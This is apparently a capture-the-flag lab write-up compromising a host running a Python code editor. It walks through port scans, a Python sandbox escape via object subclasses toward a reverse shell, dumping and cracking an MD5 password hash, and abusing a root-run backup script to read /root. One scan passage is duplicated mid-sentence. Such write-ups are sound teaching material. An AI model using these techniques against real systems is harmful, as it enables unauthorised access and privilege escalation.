Nmap scan
```bash
nmap -p- -T4-min-rate=10000 10.10.11.62
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 09:17 EDT
Nmap scan report for 10.10.11.62
Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 56.68 seconds
```
2 ports are open 22 for ssh and 5000 for something called upnp.
Lets do a more specific scan
```bash
nmap -p 22,5000 -sC -sV 10.10.11.62    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 09:19 EDT
Nmap scan report for 10.10.11.62
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds
```
On the website we can find a pyth do a more specific scan
```bash
nmap -p 22,5000 -sC -sV 10.10.11.62    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 09:19 EDT
Nmap scan report for 10.10.11.62
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds
```
On the website we can find a python code editor.on code editor.
I used this line of code to get some more information
```bash
print((()).__class__.__bases__[0].__subclasses__())
```
We got a long list of classes. We are searching for popen since that's a way to create a revshell. We know its there since we can just CTRL + F and search for it.
```bash

```
We managed to get a reverse shell succesfully. I was able to get the user.txt from the ~/ and after that i decided to import linpeas over to enumerate the machine further.
I found a database.db which has a password for the user martin. Its hashed so we have to use hashcat.
```bash
sqlite> .dumb user
Error: unknown command or invalid arguments:  "dumb". Enter ".help" for help                                
sqlite> .dump user
PRAGMA foreign_keys=OFF;                                                                                    
BEGIN TRANSACTION;                                                                                          
CREATE TABLE user (                                                                                         
        id INTEGER NOT NULL,                                                                                
        username VARCHAR(80) NOT NULL,                                                                      
        password VARCHAR(80) NOT NULL,                                                                      
        PRIMARY KEY (id), 
        UNIQUE (username)
);
INSERT INTO user VALUES(1,'development','759b74ce43947f5f4c91aeddc3e5bad3');
INSERT INTO user VALUES(2,'martin','3de6f30c4a09c27fc71932bfc68474be');
COMMIT;
sqlite> 
```
```bash
hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 3de6f30c4a09c27fc71932bfc68474be
Time.Started.....: Fri Jul 25 10:52:57 2025 (1 sec)
Time.Estimated...: Fri Jul 25 10:52:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3578.0 kH/s (0.07ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5227008/14344385 (36.44%)
Rejected.........: 0/5227008 (0.00%)
Restore.Point....: 5226496/14344385 (36.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: nag3703 -> nafakajote
Hardware.Mon.#1..: Util: 42%

Started: Fri Jul 25 10:52:56 2025
Stopped: Fri Jul 25 10:53:00 2025
```
Ok so the password is nafeelswordsmaster for martin. Lets switch to ssh so its better.

```bash
martin@code:~/backups$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```
For the exploiting part I had to look for outside help since I couldn't have done it on my own.

But basically we abused the ability to run the backy as root and to backup the roots home folder and paste it to your own ~/ and read the root.txt
It used an .json file to exploit similar to this
```bash
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": true,
	"directories_to_archive": [
		"/root/"
	]
}
```

